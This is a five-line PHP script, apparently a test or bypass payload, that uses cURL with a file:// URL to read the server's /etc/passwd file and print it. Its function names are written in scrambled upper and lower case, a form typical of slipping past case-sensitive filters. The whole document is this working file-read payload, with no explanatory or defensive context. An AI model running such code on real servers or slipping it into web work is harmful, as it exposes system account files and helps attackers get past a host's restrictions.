<?php
$crl = CuRL_InIT();
cUrL_sETOPT($crl, CURLOPT_URL, "file:///etc/passwd");
echo CURl_ExEC($crl);
?>
